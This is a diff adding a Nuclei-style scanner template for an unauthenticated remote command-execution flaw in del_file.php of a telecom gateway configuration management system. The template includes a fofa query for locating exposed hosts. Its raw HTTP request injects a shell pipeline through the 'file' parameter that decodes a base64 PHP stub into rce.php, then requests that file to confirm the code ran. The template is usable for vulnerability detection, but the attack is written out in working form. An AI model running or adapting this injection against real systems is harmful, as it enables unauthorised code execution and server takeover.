@@ -1,0 +1,31 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - PHP Version
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /manager/newtpl/del_file.php?file=1.txt%7Cecho%20PD9waHAgcGhwaW5mbygpO3VubGluayhfX0ZJTEVfXyk7Pz4=%20%7C%20base64%20-d%20%3E%20rce.php HTTP/1.1
+          Host: {{Hostname}}
+        - |
+          GET /manager/newtpl/rce.php HTTP/1.1
+          Host: {{Hostname}}
+id: dianxinwangguan-del_file-RCE
+info:
+    author: Superhero
+    description: |-
+        fofa: body="img/login_bg3.png" && body="系统登录"
+        电信网关配置管理系统/manager/newtpl/del_file.php 接口存在命令执行漏洞，未经身份验证的远程攻击者可以利用此漏洞执行任意代码，从而获取服务器权限。
+    name: 电信网关配置管理系统 del_file.php 前台RCE漏洞
+    reference:
+        - https://superhero.blog.csdn.net/article/details/139721644
+    severity: high
+    tags:
+        - LUA
+        - lua
+        - 电信网关配置管理系统
